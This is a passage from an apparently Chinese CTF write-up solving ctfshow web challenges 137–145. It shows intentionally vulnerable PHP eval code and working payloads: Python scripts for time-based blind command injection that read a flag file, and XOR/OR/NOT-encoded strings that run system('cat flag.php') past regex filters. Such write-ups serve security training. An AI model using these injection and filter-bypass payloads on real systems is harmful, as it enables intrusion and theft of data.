punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><blockquote><p><a href="https://stackoverflow.com/questions/10534360/php-call-user-func-on-a-static-method">PHP call_user_func on a static method</a></p><pre class="language-none"><code class="language-none">$class &#x3D; &#39;\\MyBundleNamespace\\MyClass&#39;; $method &#x3D; &#39;myFunction&#39;;</code></pre><p>Both calls should work:</p><pre class="language-none"><code class="language-none">call_user_func(&quot;$class::$method&quot;); call_user_func(array($class, $method));</code></pre></blockquote><p>payload: <code>ctfshow=ctfshow::getFlag</code><br>payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><p>过滤了::但是可以用数组</p><h4 id="web139-命令盲注"><a href="#web139-命令盲注" class="headerlink" title="web139(命令盲注)"></a>web139(命令盲注)</h4><p>使用tee发现没有回显，可以使用命令盲注</p><p><strong>ls &#x2F;</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">'_~'</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#行</span>    key<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#列</span>        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#awk 'NR==&#123;0&#125;'逐行输出获取</span>        <span class="token comment">#cut -c &#123;1&#125; 截取单个字符</span>            payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token comment">#print(payload)</span>            url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result<span class="token operator">=</span>result<span class="token operator">+</span>n                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'~'</span><span class="token punctuation">:</span>                key<span class="token operator">=</span><span class="token number">1</span>                result<span class="token operator">+=</span><span class="token string">" "</span></code></pre><p><strong>cat &#x2F;f149_15_h3r3</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web140-php-intval"><a href="#web140-php-intval" class="headerlink" title="web140(php &#x3D;&#x3D;  intval)"></a>web140(php &#x3D;&#x3D;  intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://blog.csdn.net/qq_47804678/article/details/128814377">php比较绕过（强比较“&#x3D;&#x3D;&#x3D;”&#x2F;弱比较“&#x3D;&#x3D;“）</a></p><p>因为是<code>==</code>，字符串和数字比较时，会将字符串先转化成数字类型在进行比较。</p><p>字符串以数字开头时，以开头数字（到字母出现截止）作为转换结果；开头不是数字的字符串或空（null），则转换为0。</p><blockquote><p>‘12’&#x3D;&#x3D;12    &#x2F;&#x2F;true<br>‘12abc’&#x3D;&#x3D;12 &#x2F;&#x2F;true<br>‘adm2n’&#x3D;&#x3D;0  &#x2F;&#x2F;true</p></blockquote><p>所以只需要$code的值不为1开头的字符串即可，于是构造让其返回0</p><blockquote><p>intval() 成功时，返回参数的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。<br>字符串有可能返回 0，取决于字符串最左侧的字符。<br>intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></blockquote><p>Payload:</p><blockquote><p>system(system())—&gt; f1&#x3D;system&amp;f2&#x3D;system</p><p>string system( string $command[, int &amp;$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(‘FLASE’)，空指令，失败返回FLASE。</p><p>usleep(usleep())—&gt; f1&#x3D;usleep&amp;f2&#x3D;usleep<br>usleep没有返回值。 所以intval参数为空，失败返回0</p><p>getdate(getdate())—&gt; f1&#x3D;getdate&amp;f2&#x3D;getdate</p><p>array getdate([ int $timestamp &#x3D; time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())—-&gt;getdate(array型)—&gt;失败返回flase，intval为0。</p></blockquote><h4 id="web141-函数与数字运算"><a href="#web141-函数与数字运算" class="headerlink" title="web141(函数与数字运算)"></a>web141(函数与数字运算)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>\W</strong>：与任何非单词字符匹配。就是除了数字、字母、下划线。等价于<code>[^A-Za-z0-9_]</code></p><p>php里数字可以和命令可以进行运算。也就是说v3里要执行的函数前后加上运算符即可。</p><p>举例理解一下：<code>1-phpinfo()-1</code>的结果为0，phpinfo()执行成功返回true，1-1-1&#x3D;-1。</p><p>同理<code>system()</code>也可执行。</p><p>取反<code>~</code>异或<code>^</code>或<code>|</code>都可以</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload:</p><blockquote><p>?v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;%2b(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%06%0c%01%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%2e%60%60%60”)%2b</p><p>%2b&#x3D;+</p><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;-(<del>‘%8C%86%8C%8B%9A%92’)(</del>‘%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F’)-</p></blockquote><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p>0和0x0绕过 这里绕过因为是因为当成了8进制和16进制</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>同142，ban了取反和或同时也ban了+-可以使用*，好像没ban异或<code>^</code></p><p>Payload:<code>?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*</code></p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token constant boolean">true</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>限制了v3的长度，并对v2进行check,可以使用<code>|``^</code>只是调换位置罢了</p><p>Payload:<code>?v1=1&amp;v2=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&amp;v3=-</code></p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token 